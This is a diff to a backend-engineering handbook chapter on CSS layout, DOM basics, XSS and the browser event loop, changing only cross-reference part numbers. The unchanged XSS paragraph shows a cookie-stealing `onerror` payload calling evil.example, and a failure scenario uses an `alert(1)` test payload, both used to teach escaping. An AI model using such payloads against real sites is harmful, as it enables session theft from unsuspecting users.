@@ -194,7 +194,7 @@ flowchart LR
 
 #### How a Senior Backend Engineer thinks about this
 
-A backend engineer writing an internal tool does not need pixel-perfect design; they need a layout that never hides a button, works on a phone, keeps a visible focus ring, and is easy for the next person to change. They keep CSS small, class-based and mobile-first, use flexbox for one-dimensional rows and columns and grid for page structure, and stop there. When a screen becomes a product, they hand design to people who do it for a living, with Part 71 (71.4) as the shared vocabulary.
+A backend engineer writing an internal tool does not need pixel-perfect design; they need a layout that never hides a button, works on a phone, keeps a visible focus ring, and is easy for the next person to change. They keep CSS small, class-based and mobile-first, use flexbox for one-dimensional rows and columns and grid for page structure, and stop there. When a screen becomes a product, they hand design to people who do it for a living, with Part 75 (75.4) as the shared vocabulary.
 
 #### Interview questions
 
@@ -286,11 +286,11 @@ The everyday DOM toolkit:
 | Classes | `el.classList.add('is-error')`, `.remove()`, `.toggle()` |
 | Show and hide | `el.hidden = true` |
 
-**XSS in one paragraph.** **Cross-site scripting (XSS)** is an attacker's script running inside your page, in your user's browser, with your user's session. The Part 6 DTO accepts any name of 1 to 200 characters, so `<img src=x onerror="fetch('https://evil.example/c?d='+document.cookie)">` is a valid product. With `title.textContent = p.name`, staff see that odd string and nothing happens. With `li.innerHTML = '<h3>' + p.name + '</h3>'`, the browser creates an image, it fails to load, and the `onerror` code runs for every admin who opens the page, able to read what the page reads and call your API as that admin. Stored in your database and served to others, this is **stored XSS**, the most damaging kind. The fix is boring and total: build elements and use `textContent` for every piece of data. Part 40 (40.21) covers XSS and Content Security Policy from the server side; Part 77 (77.7) covers the frontend side, including React's escaping and what `dangerouslySetInnerHTML` undoes.
+**XSS in one paragraph.** **Cross-site scripting (XSS)** is an attacker's script running inside your page, in your user's browser, with your user's session. The Part 6 DTO accepts any name of 1 to 200 characters, so `<img src=x onerror="fetch('https://evil.example/c?d='+document.cookie)">` is a valid product. With `title.textContent = p.name`, staff see that odd string and nothing happens. With `li.innerHTML = '<h3>' + p.name + '</h3>'`, the browser creates an image, it fails to load, and the `onerror` code runs for every admin who opens the page, able to read what the page reads and call your API as that admin. Stored in your database and served to others, this is **stored XSS**, the most damaging kind. The fix is boring and total: build elements and use `textContent` for every piece of data. Part 44 (44.21) covers XSS and Content Security Policy from the server side; Part 81 (81.7) covers the frontend side, including React's escaping and what `dangerouslySetInnerHTML` undoes.
 
 #### Failure scenario
 
-At 10:40 on a Monday, support reports that the admin product page "flickers and then logs everyone out". In DevTools the on-call engineer sees requests to an unknown domain in the Network panel and an `<img>` element in one product card that should not exist. A product imported on Friday has an HTML payload as its name, and the card was built with `innerHTML` and a template string. The API did nothing wrong: it stored a string. The team rotates sessions, rewrites the card with `createElement` and `textContent`, adds a Content Security Policy (Part 40, 40.33), and adds a test that creates a product named `<img src=x onerror=alert(1)>` and asserts the page shows it as text. Escaping belongs where data meets HTML, in every client.
+At 10:40 on a Monday, support reports that the admin product page "flickers and then logs everyone out". In DevTools the on-call engineer sees requests to an unknown domain in the Network panel and an `<img>` element in one product card that should not exist. A product imported on Friday has an HTML payload as its name, and the card was built with `innerHTML` and a template string. The API did nothing wrong: it stored a string. The team rotates sessions, rewrites the card with `createElement` and `textContent`, adds a Content Security Policy (Part 44, 44.33), and adds a test that creates a product named `<img src=x onerror=alert(1)>` and asserts the page shows it as text. Escaping belongs where data meets HTML, in every client.
 
 #### Edge cases & failure modes
 
@@ -351,7 +351,7 @@ flowchart LR
     next --> task
 ```
 
-| | Node.js (Part 2, Part 10) | Browser main thread |
+| | Node.js (Part 2, Part 13) | Browser main thread |
 |---|---|---|
 | One thread runs your JavaScript | yes | yes |
 | Tasks come from | timers, I/O, sockets (libuv phases) | user input, timers, network responses, messages |
@@ -359,7 +359,7 @@ flowchart LR
 | Rendering | none | between tasks, about every 16.7 ms at 60 Hz |
 | What blocking costs you | every other request waits | the page freezes: no clicks, no scrolling, no paint |
 
-The consequence is the same lesson as Node, with a more visible symptom. If a click handler spends 800 ms sorting 200,000 products, nothing else happens for 800 ms: the button does not show its pressed state, the spinner does not spin, typing is lost. `fetch` does not block (the network wait happens outside your JavaScript, like I/O in Node), but heavy synchronous work does. Keep handlers short, let the server sort and paginate, and see Part 71 (71.7) for long tasks and Part 10 (10.16, 10.17) for the Node side in depth.
+The consequence is the same lesson as Node, with a more visible symptom. If a click handler spends 800 ms sorting 200,000 products, nothing else happens for 800 ms: the button does not show its pressed state, the spinner does not spin, typing is lost. `fetch` does not block (the network wait happens outside your JavaScript, like I/O in Node), but heavy synchronous work does. Keep handlers short, let the server sort and paginate, and see Part 75 (75.7) for long tasks and Part 13 (13.16, 13.17) for the Node side in depth.
 
 #### Edge cases & failure modes
 
